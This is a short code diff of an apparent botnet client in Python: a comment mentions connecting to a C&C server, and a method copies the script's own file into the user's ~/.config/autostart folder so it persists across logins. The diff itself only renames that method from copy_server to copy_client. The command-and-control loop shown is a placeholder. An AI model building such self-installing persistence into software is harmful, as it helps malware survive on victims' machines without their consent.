@@ -15,7 +15,7 @@ class client:
         self.get_lock()
 
         # copy the file content
-        self.copy_server()
+        self.copy_client()
 
         # main loop, this is where client connects to the C&C server. I am not sure excatly how this is to be done using scapy so using a dummy infinite loop for testing instead
         while True:
@@ -67,15 +67,15 @@ class client:
             print('Process already exists', file=sys.stderr)
             sys.exit()
 
-    def copy_server(self):
+    def copy_client(self):
         auto_config_dir = os.path.join(os.getenv("HOME"), ".config", "autostart")
-        auto_config_file = os.path.join(auto_config_dir, "server.py")
+        auto_config_file = os.path.join(auto_config_dir, "client.py")
         try:
             if not os.path.exists(auto_config_dir):
                 os.mkdir(auto_config_dir)
             shutil.copyfile(__file__, auto_config_file)
         except Exception as e:
-            print("failed to copy server, error: {}".format(str(e)), file=sys.stderr)
+            print("failed to copy client, error: {}".format(str(e)), file=sys.stderr)
 
 if  __name__ ==  '__main__':
     client()
